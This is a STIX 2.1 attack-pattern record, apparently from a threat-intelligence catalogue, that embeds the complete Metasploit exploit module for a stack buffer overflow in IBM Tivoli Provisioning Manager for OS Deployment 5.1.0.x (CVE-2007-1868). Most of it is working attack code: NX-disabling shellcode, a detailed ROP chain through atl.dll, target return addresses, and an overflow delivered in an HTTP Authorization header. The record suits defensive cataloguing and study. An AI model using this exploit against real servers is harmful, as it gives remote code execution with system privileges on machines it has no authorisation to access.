{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4c7d482b-fdc9-4e0e-afe9-229b00fc3d22",
    "created": "2024-08-14T16:54:00.474602Z",
    "modified": "2024-08-14T16:54:00.474606Z",
    "name": "IBM TPM for OS Deployment 5.1.0.x rembo.exe Buffer Overflow",
    "description": " This is a stack buffer overflow exploit for IBM Tivoli Provisioning Manager for OS Deployment version 5.1.0.X. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ibm_tpmfosd_overflow.rb",
            "external_id": "ibm_tpmfosd_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-1868"
        },
        {
            "source_name": "reference",
            "url": "http://dvlabs.tippingpoint.com/advisory/TPTI-07-05"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM TPM for OS Deployment 5.1.0.x rembo.exe Buffer Overflow',\n      'Description'    => %q{\n          This is a stack buffer overflow exploit for IBM Tivoli Provisioning Manager\n        for OS Deployment version 5.1.0.X.\n      },\n      'Author'         => 'toto',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2007-1868'],\n          [ 'OSVDB', '34678'],\n          [ 'BID', '23264'],\n          [ 'URL', 'http://dvlabs.tippingpoint.com/advisory/TPTI-07-05' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          #'Space'    => 0x200,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c&=+?:;-,/#.\\\\$%\\x1a\",\n          'Prepend' =>\n              # Disable NX on 2k3 to upload data on the stack\n              # (service crashes if the stack is switched to the heap)\n              \"\\x64\\x8b\\x0d\\x30\\x00\\x00\\x00\"              + # mov ecx, dword ptr fs:[0x30] ; PEB\n              \"\\x83\\xb9\\xa4\\x00\\x00\\x00\\x05\"              + # cmp dword ptr [ecx+0xa4], 5  ; MajorVersion == 5\n              \"\\x75\\x30\"                                  + # jnz after\n              \"\\x83\\xb9\\xa8\\x00\\x00\\x00\\x02\"              + # cmp dword ptr [ecx+0xa8], 2  ; MinorVersion == 2\n              \"\\x75\\x27\"                                  + # jnz after\n              \"\\x81\\xb9\\xac\\x00\\x00\\x00\\xce\\x0e\\x00\\x00\"  + # cmp dword ptr [ecx+0xac], 0xece  ; BuildVersion (> SP0)\n              \"\\x76\\x1b\"                                  + # jbe after\n              \"\\x8d\\x89\\xa8\\x00\\x00\\x00\"                  + # lea ecx, [ecx+0xa8]\n              \"\\xba\\x00\\x03\\xfe\\x7f\"                      + # mov edx, 0x7ffe0300\n              \"\\xb8\\xed\\x00\\x00\\x00\"                      + # mov eax, 0xed\n              \"\\x6a\\x04\"                                  + # push 4\n              \"\\x51\"                                      + # push ecx\n              \"\\x6a\\x22\"                                  + # push 22\n              \"\\x6a\\xff\"                                  + # push -1\n              \"\\x6a\\xff\"                                  + # push -1 (padding)\n              \"\\xff\\x12\",                                   # call dword ptr[edx]\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['TPMfOSD 5.1 (Windows 2000 SP4 - English)', { 'Rets' => [0x77bb53af, 0x77bb06f0, 0x75022ac5] }],\n          # tested against 5.1.0.1 and 5.1.0.2 (use ATL.Dll)\n          ['TPMfOSD 5.1 (Windows 2003 All - English)', { 'IB' => 0x76a80000, 'Data' => 0x01061980 }],\n        ],\n      'DisclosureDate' => '2007-05-02',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Use SSL', true]),\n      ])\n  end\n\n  def exploit\n\n    if target.name =~ /2003/\n      # the exploit allocates and executable heap to copy and execute the payload\n\n      auth = Rex::Text.rand_text_alphanumeric(2800)\n\n      ib = target['IB']\n\n      auth[ 2080, 4 ] = [ ib + 0x11010 ].pack('V')  # store a data to prevent a crash\n\n      # ret 1:\n      # 76a81a5f:\n      # pop esi  <- 0x76a91010\n      # pop ebx  <- 0x76a91010\n      # pop ebp  <- 0x76a91010\n      # retn\n\n      auth[ 2096, 4 ] = [ ib + 0x1a5f ].pack('V')\n      auth[ 2100, 4 ] = [ target['Data'] ].pack('V')\n      auth[ 2104, 4 ] = [ ib + 0x11010 ].pack('V')\n      auth[ 2108, 4 ] = [ ib + 0x11010 ].pack('V')\n\n      # ret 2:\n      # 76a817f0:\n      # pop esi   <- 0x76a81512 (ocscpy pointer)\n      # retn\n\n      auth[ 2112, 4 ] = [ ib + 0x17f0 ].pack('V')\n      auth[ 2116, 4 ] = [ ib + 0x1512 ].pack('V')\n\n      # ret 3: (copy the payload in atl.dll data)\n      # 76a811c8\n      # lea eax, [esp+3c]   <-- eax points to the payload\n      # push eax       <- payload\n      # push ebp       <- 0x76a91010\n      # call esi       <- ocscpy\n      # cmp eax, ebx   <- eax == ebx = 0x76a91010\n      # jnz before     <- jump not taken\n      # mov eax, ebp\n      # pop edi\n      # pop esi\n      # pop ebp\n      # pop ebx\n      # add esp, 1ch\n      # retn\n\n      auth[ 2120, 4 ] = [ ib + 0x11c8 ].pack('V')\n\n\n      # ret 4:  (increase the stack pointer to allow a jump back in the payload)\n      # add esp, 1ch\n      # retn\n\n      auth[ 2160, 4 ] = [ ib + 0x11da ].pack('V')\n      auth[ 2184, 2 ] = \"\\xeb\\x56\"    # jmp payload\n\n\n      # ret 5: (create an executable heap - huge one)\n      # 76a8c0c4\n      # jmp ds:__imp_HeapCreate  (0xffffffff, 0x01010101, 0x01010101)\n\n      auth[ 2196, 4 ] = [ ib + 0xc0c4 ].pack('V')\n\n      # ret 6:\n      # 76a817f0\n      # pop esi  <- 0x76a92a38 (hHeap)\n      # retn\n\n      auth[ 2204, 4 ] = [ ib + 0x17f0 ].pack('V')\n      auth[ 2208, 4 ] = [ 0xffffffff ].pack('V')\n      auth[ 2212, 4 ] = [ 0x01010101 ].pack('V')\n      auth[ 2216, 4 ] = [ 0x01010101 ].pack('V')\n      auth[ 2220, 4 ] = [ ib + 0x12a38 ].pack('V')\n\n      # ret 7:\n      # 76a8190a\n      # mov [esi], eax   <- store new heap in hHeap\n      # mov eax, esi\n      # pop esi\n      # retn 4\n\n      auth[ 2224, 4 ] = [ ib + 0x190a ].pack('V')\n\n      # ret 8 (_calloc - needed to allocate a small buffer to prevent a no mem exception):\n      # 76a88a29\n      # mov eax, [esp+arg_0]  <- 0x7fffffa0\n      # imul eax, [esp+arg_4] <- eax * 0x7fffffa0 = 0x2400\n      # push eax\n      # call _malloc\n      # pop ecx    <- ecx = 0x2400\n      # retn\n\n      auth[ 2232, 4 ] = [ ib + 0x8a29 ].pack('V')\n\n      # ret 9:\n      # 76a8c9ab\n      # add esp, 0ch\n      # retn 4\n\n      auth[ 2240, 4 ] = [ ib + 0xc9ab ].pack('V')\n      auth[ 2244, 4 ] = [ 0x7fffffa0 ].pack('V')\n      auth[ 2248, 4 ] = [ 0x7fffffa0 ].pack('V')\n\n      # ret 10 (copy payload into heap):\n      # 76a8c9a0\n      # push ecx   <- 0x2400\n      # push [esp+8]  <- 0x76a91010   (payload in atl.dll data)\n      # push eax    <- heap pointer\n      # call _memcpy\n      # add esp, 0ch\n      # retn\n\n      auth[ 2256, 4 ] = [ ib + 0xc9a0 ].pack('V')\n\n      # ret 11 (jump into heap)\n      # 76a815e7\n      # call eax\n\n      auth[ 2264, 4 ] = [ ib + 0x15e7 ].pack('V')\n      auth[ 2268, 4 ] = [ ib + 0x11010 ].pack('V')\n\n      auth[ 2272, payload.encoded.length ] = payload.encoded\n\n    else\n      auth = Rex::Text.rand_text_alphanumeric(2800)\n\n      auth[ 2080, 4 ] = [ target['Rets'][1] ].pack('V')\n      auth[ 2096, 4 ] = [ target['Rets'][2] ].pack('V')  # pop, ret\n      auth[ 2100, 4 ] = [ target['Rets'][1] ].pack('V')\n      auth[ 2104, 4 ] = [ target['Rets'][0] ].pack('V')  # jmp esp\n      auth[ 2108, payload.encoded.length ] = payload.encoded\n\n    end\n\n    print_status(\"Trying target #{target.name}...\")\n\n    res = send_request_cgi({\n      'uri'          => '/',\n      'method'       => 'GET',\n      'headers'      =>\n      {\n        'Authorization' => \"Basic #{auth}\"\n      }\n    }, 5)\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-05-02",
    "x_mitre_platforms": [
        "win'"
    ]
}